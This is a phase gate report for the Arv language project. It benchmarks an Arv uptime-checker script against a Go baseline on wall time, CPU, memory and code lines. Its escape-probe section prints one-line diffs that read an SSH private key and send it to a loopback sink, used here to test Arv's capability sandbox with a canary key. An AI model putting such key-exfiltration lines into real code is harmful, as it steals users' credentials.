# Phase 5 gate report

The measurement and the verdict for the gate in [`12-phase5-gate.md`](12-phase5-gate.md). The criteria were fixed before measuring. Nothing in the scenario, `examples/uptime.arv`, `bench/uptime-go`, `bench/farm` or the criteria changed after the first measured run. Deviations from the design, made while building and before measuring, are listed in [`p5-plan-1.md`](p5-plan-1.md). The build is recorded in [`16m-phase5-notes.md`](16m-phase5-notes.md) and [`16n-phase5-round1.md`](16n-phase5-round1.md). The design names `docs/research/2026-phase5-gate.md` for this write-up. The kickoff ([`17-phases-3-8-kickoff.md`](17-phases-3-8-kickoff.md)) names this file, so the report is here.

**Verdict: criteria 1 to 5 hold. Criterion 6 is the owner's call** (my sentence is below). If 6 holds, Phases 6 to 8 go ahead as a language. If it does not, the plan calls for one week of ergonomics work (`.field`, interpolation, `&&`/`||`, `<=`/`>=`) and then one re-run of the gate.

## Setup

| | |
|---|---|
| Commit measured | `95135406c54cc33748d34bdc2a77f3c7ba6ef66f` (branch `phase/p5`, clean tree) |
| Machine | Apple M1 Pro, 8 cores, 16 GiB, macOS 26.6.2 (25G83) |
| Go | go1.26.2 darwin/arm64; `go 1.24.0` in both `go.mod` files; `golang.org/x/sync` v0.19.0 |
| Farm | the defaults: `-n 200 -latency 50ms-400ms -fail 0.1 -flaky 0.05 -seed 1`, on 127.0.0.1 only |
| Arv flags | `--allow fs_read=targets.txt --allow fs_write=out --allow net=127.0.0.1:PORT` |
| Date | 2026-11-11, 16:40-16:42 AST |

**Machine load (`uptime`).** Before: `load averages: 4.99 8.43 16.43`. During, sampled every 15 s: 4.99, 4.97, 4.76, 7.99, 7.55, 10.69 (1-minute averages). After: `load averages: 10.69 9.08 15.98`. The machine is shared. It was lightly loaded during these runs compared with the load of 300 or more seen in earlier sessions.

## Reproduce

```sh
cd /path/to/arvlang && git checkout 95135406c54cc33748d34bdc2a77f3c7ba6ef66f
df -h /System/Volumes/Data               # needs more than 1 GB free
uptime
RUNS=10 bench/run.sh                     # or: make bench; rows in bench/out/results.csv
bench/escape/probe.sh                    # or: make escape; bench/out/escape/summary.txt
```

`bench/run.sh` builds `arv`, `farm` and `uptime-go` into `bench/out/bin` and starts one farm. Each round runs both versions, and the order alternates every round (odd rounds Arv first, even rounds Go first). Each run is timed with `/usr/bin/time -l` and starts with a `POST /reset`. After each run the script reads `/stats` from the farm and compares `report.json` with the farm's expected report using `farm compare`, which ignores latency.

## Raw numbers, every run

`max_rss_kb` is KiB: macOS reports bytes and `run.sh` divides by 1024. CPU is user plus sys time. `/usr/bin/time` reports it to 0.01 s.

```
version,run,wall_s,user_s,sys_s,cpu_s,max_rss_kb,peak_in_flight,requests,exit_code,report_ok
arv,1,3.93,0.11,0.10,0.21,19680,20,230,1,yes
go,1,3.93,0.04,0.04,0.08,14368,20,230,1,yes
go,2,3.59,0.04,0.04,0.08,14976,20,230,1,yes
arv,2,3.60,0.08,0.07,0.15,19664,20,230,1,yes
arv,3,3.59,0.08,0.07,0.15,19808,20,230,1,yes
go,3,3.57,0.03,0.03,0.06,14960,20,230,1,yes
go,4,3.58,0.03,0.03,0.06,14816,20,230,1,yes
arv,4,3.59,0.08,0.07,0.15,19968,20,230,1,yes
arv,5,3.63,0.08,0.07,0.15,19840,20,230,1,yes
go,5,3.57,0.03,0.03,0.06,15088,20,230,1,yes
go,6,3.59,0.04,0.03,0.07,14976,20,230,1,yes
arv,6,3.59,0.08,0.07,0.15,20080,20,230,1,yes
arv,7,3.59,0.08,0.07,0.15,19872,20,230,1,yes
go,7,3.58,0.04,0.03,0.07,14752,20,230,1,yes
go,8,3.58,0.03,0.03,0.06,14688,20,230,1,yes
arv,8,3.59,0.09,0.07,0.16,20176,20,230,1,yes
arv,9,3.60,0.09,0.07,0.16,19728,20,230,1,yes
go,9,3.60,0.03,0.03,0.06,15152,20,230,1,yes
go,10,3.58,0.04,0.03,0.07,14592,20,230,1,yes
arv,10,3.59,0.08,0.06,0.14,19824,20,230,1,yes
```

Summary that `run.sh` printed (its medians are rounded to 0.01 s):

```
code lines: arv 28, go 115
arv: median wall 3.59s, median cpu 0.15s, median rss 19832 KiB, max peak in flight 20, wrong reports 0, exit codes 1
go: median wall 3.58s, median cpu 0.07s, median rss 14888 KiB, max peak in flight 20, wrong reports 0, exit codes 1
versions agree: 20 reports and summaries, all the same as arv run 1
```

**Medians computed by hand from the rows** (10 values each, so each median is the mean of the 5th and 6th sorted values):

| | Arv | Go | Arv / Go |
|---|---|---|---|
| Wall (s) | 3.59 | 3.58 | 1.003 |
| CPU (s) | 0.15 | 0.065 | 2.31 |
| Peak RSS (KiB) | 19832 | 14888 | 1.332 |

`run.sh` prints Go's median CPU as 0.07 because it rounds 0.065. The ratio above uses 0.065, the value that is less favourable to Arv. Even the worst pair, Arv's highest CPU (0.21) over Go's lowest (0.06), gives 3.5.

Both versions printed `{"down":20,"total":200}` and exited 1 (`more than 5% of the targets are down`). The default farm has 20 of its 200 targets down (10%), so exit 1 is the correct result for both.

## Code lines

**Method** (the one in `run.sh`): count the lines that are not blank and do not start with `//` after leading whitespace. A code line with a trailing comment counts as code. Files: `examples/uptime.arv` (44 lines in total) and `bench/uptime-go/main.go` (132 lines in total; `main_test.go` is not counted).

| Method | Arv | Go | Ratio |
|---|---|---|---|
| `run.sh`: not blank, not a `//` comment (**the criterion**) | 28 | 115 | **0.243** |
| Also drop Go's `package` line and `import ( … )` block | 28 | 101 | 0.277 |
| Also drop lines with only closing brackets | 22 | 90 | 0.244 |

The other two methods only check that the result does not depend on the counting method. The criterion uses the first one.

## Escape probe output

`bench/escape/probe.sh` adds one line to each version, from the current sources. `HOME` points at a temp directory whose `.ssh/id_ed25519` holds a 29-byte canary, so the real key is never read. The "other host" is a second farm on another loopback port, and its `/sink` counts what arrives. The Arv versions run with the same `--allow` flags as the benchmark. Arv has no POST, so the Arv probe sends the key in a GET query string. It reads the key by absolute path, while the Go probe uses `$HOME`. Both choices are listed in `p5-plan-1.md` item 8.

Lines added (diffs against the measured sources):

```
arv-read-and-send.arv, after line 30:
> http_get("http://127.0.0.1:59733/sink?key=" + read_file("/…/bench/out/escape/home/.ssh/id_ed25519"));
arv-send-only.arv, after line 30:
> http_get("http://127.0.0.1:59733/sink?key=stolen");
go/main.go, after line 48:
> 	if key, err := os.ReadFile(os.Getenv("HOME") + "/.ssh/id_ed25519"); err == nil { http.Post("http://127.0.0.1:59733/sink", "text/plain", strings.NewReader(string(key))) }
```

`bench/out/escape/summary.txt`, with the absolute prefix `/Users/…/arvlang-wt/p5/bench/out/escape` shortened to `…`:

```
arv-read-and-send: exit 1, capability denied: yes, sink requests: 0, sink bytes: 0
  stderr: error: capability denied: fs_read("…/home/.ssh/id_ed25519") in task root (holds: [fs_read("…/work/targets.txt"), fs_write("…/work/out"), net("127.0.0.1:59732")]) (at …/arv-read-and-send.arv:31:47)
arv-send-only: exit 1, capability denied: yes, sink requests: 0, sink bytes: 0
  stderr: error: capability denied: net("127.0.0.1:59733") in task root (holds: [fs_read("…/work/targets.txt"), fs_write("…/work/out"), net("127.0.0.1:59732")]) (at …/arv-send-only.arv:31:1)
go-read-and-send: exit 1, capability denied: no, sink requests: 1, sink bytes: 29
  stderr: error: more than 5% of the targets are down
canary: 29 bytes
```

Arv refuses the read before any network call is made. The send-only probe shows that the network is closed whether or not the read happens. The Go probe delivered the whole 29-byte canary to the sink and then ran its normal check (it printed `{"down":20,"total":200}`).

## Verdict per criterion

| # | Criterion | Arv | Go | Arv / Go | Threshold | Holds? |
|---|---|---|---|---|---|---|
| 1 | Code lines (not blank, not a `//` comment) | 28 | 115 | 0.243 | ≤ 0.5 | **yes** |
| 2 | Median wall time (s) | 3.59 | 3.58 | 1.003 | ≤ 1.2 | **yes** |
| 3a | Median peak RSS (KiB) | 19832 | 14888 | 1.332 | ≤ 3 | **yes** |
| 3b | Median CPU, user + sys (s) | 0.15 | 0.065 | 2.31 | ≤ 5 | **yes** |
| 4a | Runs whose report matched the farm | 10/10 | 10/10 | n/a | 10/10 both | **yes** |
| 4a′ | Every run's report and summary the same as Arv's first run | `versions agree: 20 reports and summaries` | | n/a | agree | **yes** |
| 4b | Largest peak in flight, all runs | 20 | 20 | n/a | ≤ 20 both | **yes** |
| 4c | Exit code (20 of 200 down) | 1 | 1 | n/a | 1 for both | **yes** |
| 5 | Escape probe | denied (`capability denied`, both probes, same `--allow` flags), 0 bytes reached the sink | 29 of 29 canary bytes reached the sink | n/a | Arv denied, Go succeeds | **yes** |
| 6 | Would you rather write the next ops script in Arv? | see below | | n/a | owner decides | **owner** |

**Criteria 1 to 5 all hold.** The plan's pivot (an `arvrt` Go library) applies only if 1 or 5 fails, and the profile-first step applies only if 2 or 3 fails. Neither is triggered.

### Reading the numbers honestly

- **Wall time is set by the farm, not by the interpreter.** Both versions run in about 3.58 s, and that time is the farm's latency schedule: 200 targets at 50 to 400 ms, 20 at a time, plus the retries and backoff for the 10 dropped targets. CPU time is about 4% of wall time for Arv and about 2% for Go. Criterion 2 shows that the interpreter does not lengthen the critical path of an I/O-bound job. It says nothing about speed on CPU-bound work. The first round (3.93 s for both versions) is warm-up, and it falls outside the medians.
- **CPU is about 2.3 times Go's, at 0.15 s against 0.065 s.** Part of the difference is not the interpreter: Arv opens a new TCP connection for every `http_get`, while Go reuses keep-alive connections. Both versions made 230 requests. A trivial Arv script (`puts(1);`) runs in under 0.01 s with about 10 MB RSS, so startup costs little. I did not profile, because neither CPU threshold failed and CPU time is a small fraction of wall time.
- **RSS is about 1.33 times Go's** (19.4 MiB against 14.5 MiB), with little spread between runs.
- **Fairness of the Go baseline.** It uses `errgroup.WithContext` with `SetLimit(20)` as the semaphore, `context.WithTimeout` covering each whole check, a retry loop on transport errors with jittered exponential backoff (the same policy as Arv's `restart`), a cloned transport with `MaxIdleConnsPerHost = 20`, and error returns all the way up. Without its imports it is still 101 lines, so it is not padded. Using `SetLimit` instead of a separate `x/sync/semaphore` makes it shorter, not longer.
- **Criterion 5 is about authority, not luck.** Each Arv check is spawned holding only `net(host)` for its own URL. The probe line ran in the root task, which holds the most authority in the program, and it was still refused, because the grants come from `--allow` and the probe did not change them.

### Criterion 6 (the owner decides)

My sentence: *For the next ops script of this shape I would rather write Arv, because the `scope (tasks: 20)` and `supervise: "restart", retries: 2, timeout_ms: 2000` headers replace the errgroup, the semaphore, the context plumbing and the retry loop, and `spawn … with [net(host)]` makes the key-stealing line fail without anyone having to review it; but the syntax still costs me in every script. I wrote `if (status > 199) { status < 300 } else { false }` because there is no `&&` or `>=`, `r["up"]` because there is no `.field`, and a hand-written recursive `count_down` because there is no loop or filter. So my yes points at the one-week ergonomics pass, not at the runtime.*

If the owner answers no, the plan says: spend one week on ergonomics (`.field` access, string interpolation, `&&`/`||`, `<=`/`>=`), then re-run this gate once with the same scenario and criteria. **Per the plan, no Phase 6 work starts before the decision is written here and in the PR description.**

### The owner's decision (2026-11-11)

**Criterion 6: yes.** The owner would rather write the next ops script in Arv, so Phases 6 to 8 go ahead as a language. The syntax cost named above is real, so the ergonomics items (`.field` access, string interpolation, `&&`/`||`, `<=`/`>=`) are added as an extra phase (Phase 5E) in the same wave as Phases 6, 7, 8.1 and 8.2, rather than as a week before them. The gate is not re-run.

**Phase 8.4 (speed): run it.** The gate does not say CPU matters (2.31x Go's CPU against a limit of 5x, about 4% of wall time). The owner chose to do the speed work anyway, in the wave with Phase 6x7.
